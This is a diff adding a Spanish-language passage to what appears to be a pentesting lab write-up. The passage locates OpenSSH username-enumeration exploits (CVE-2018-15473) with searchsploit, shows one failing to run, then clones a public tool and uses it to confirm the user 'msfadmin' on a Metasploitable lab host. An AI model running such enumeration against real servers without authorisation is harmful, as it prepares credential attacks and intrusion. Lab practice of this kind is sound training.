@@ -37,6 +37,58 @@ OpenSSH < 7.4 - 'UsePrivilegeSeparation Disable | https://www.exploit-db.com/exp
 OpenSSH < 7.4 - agent Protocol Arbitrary Librar | https://www.exploit-db.com/exploits/40963
 OpenSSH < 7.7 - User Enumeration (2)            | https://www.exploit-db.com/exploits/45939
 ------------------------------------------------ --------------------------------------------
+```
 
+Clonamos el exploit 45233 y probamos si nos funciona:
+
+```
+┌──(kali㉿kali)-[~/ssh-audit]
+└─$ searchsploit -m 45233   
+  Exploit: OpenSSH 2.3 < 7.7 - Username Enumeration
+      URL: https://www.exploit-db.com/exploits/45233
+     Path: /usr/share/exploitdb/exploits/linux/remote/45233.py
+File Type: Python script, ASCII text executable
+
+Copied to: /home/kali/ssh-audit/45233.py
+
+
+                                                                                             
+┌──(kali㉿kali)-[~/ssh-audit]
+└─$ chmod +x 45233.py 
+                                                                                             
+┌──(kali㉿kali)-[~/ssh-audit]
+└─$ ./45233.py                   
+./45233.py: 22: import: not found
+./45233.py: 23: import: not found
+./45233.py: 24: import: not found
+./45233.py: 25: import: not found
+./45233.py: 26: import: not found
+./45233.py: 27: import: not found
+./45233.py: 28: import: not found
+./45233.py: 30: old_parse_service_accept: not found
+./45233.py: 33: Syntax error: "(" unexpected
+```
+
+Al parecer este exploit no funciona con la versión de Python instalada. Podemos buscar otros exploits relacionados con este CVE en la internet.  
+Ejemplo: https://github.com/epi052/cve-2018-15473. Lo descargamos y configuramos:
+
+```
+git clone https://gitlab.com/epi052/cve-2018-15473.git
+cd cve-2018-15473
+pip install -r requirements.txt 
+```
+
+Luego podemos utilizar esta herramienta para enumerar usuarios en el servidor Metasploitable:
+
+```
+┌──(kali㉿kali)-[~/cve-2018-15473]
+└─$ ./ssh-username-enum.py 192.168.100.93 -u msfadmin2
+[+] OpenSSH version 4.7 found
+                                                                                             
+┌──(kali㉿kali)-[~/cve-2018-15473]
+└─$ ./ssh-username-enum.py 192.168.100.93 -u msfadmin 
+[+] OpenSSH version 4.7 found
+[+] msfadmin found!
+```
 
 
